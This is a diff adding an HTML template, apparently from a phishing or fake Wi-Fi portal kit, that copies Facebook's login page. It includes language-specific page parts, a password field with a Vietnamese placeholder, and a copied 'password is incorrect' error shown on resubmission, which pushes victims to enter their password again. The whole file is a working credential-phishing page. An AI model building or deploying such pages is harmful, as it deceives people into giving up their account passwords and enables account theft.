@@ -1,0 +1,33 @@
+<Script Language='Javascript'>
+    document.write(unescape('{% include "facebook/part/" ~ @LANGUAGE ~ "/part1.htm" %}'));
+</Script>
+{% if is_postback %}
+    <input type="password" class="inputtext _55r1 inputtext _1kbt _1vu8 inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="{{Mật khẩu}}" autofocus="1" aria-label="{{Mật khẩu}}" aria-describedby="js_0">
+{% else %}
+    <input type="password" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="{{Mật khẩu}}" aria-label="{{Mật khẩu}}" />
+{% endif %}
+<Script Language='Javascript'>
+document.write(unescape('{% include "facebook/part/" ~ @LANGUAGE ~ "/part2.htm" %}'));
+</Script>
+
+<Script Language='Javascript'>
+    document.write(unescape('{% include "facebook/part/" ~ @LANGUAGE ~ "/part3.htm" %}'));
+</Script>
+
+{% if is_postback %}
+    <div class="uiContextualLayerPositioner _1tpb uiLayer" data-ownerid="pass" style="width: 561px; left: 864px; top: 210px;">
+        <div class="uiContextualLayer uiContextualLayerRight">
+            <div class="_5v-0 _53in">
+                <div class="_53ij _1tp9" style="top: 0px;">
+                    <div class="_1tpa"></div>
+                    <div class="_1tp8">The password that you've entered is incorrect. <a href="/recover/initiate?lwv=120&amp;lwc=1348092">Forgotten password?</a>
+                    </div>
+                </div><i class="_53io" style="top: 0%; margin-top: 12px;"></i><a class="accessible_elem layer_close_elem" href="#" role="button" id="js_0">Close pop-up and return</a>
+            </div>
+        </div>
+    </div>            
+{% endif %}
+            </div>
+        </div>
+    </body>
+</html>
